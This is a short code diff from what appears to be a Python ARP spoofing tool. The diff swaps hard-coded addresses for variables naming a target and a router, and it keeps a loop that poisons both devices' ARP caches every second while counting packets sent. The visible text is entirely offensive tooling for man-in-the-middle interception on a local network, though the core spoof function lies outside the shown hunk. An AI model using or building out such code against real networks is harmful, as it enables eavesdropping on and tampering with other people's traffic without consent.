@@ -89,14 +89,14 @@ except IndexError:
     print("The IP address you entered is either not valid or an unknown error occoured. Exiting...")
     exit(0)
 
-print("Spoofing...\n")
+print("\nSpoofing...\n")
 
 sent_packets_count = 0
 
 try:
     while True:
-        spoof("10.10.10.12", "10.10.10.2")
-        spoof("10.10.10.2", "10.10.10.12")
+        spoof(ip_address_of_target, ip_address_of_router)
+        spoof(ip_address_of_router, ip_address_of_target)
         sent_packets_count = sent_packets_count + 2
         print("\r[+] Packets sent: " + str(sent_packets_count), end="")
         time.sleep(1)
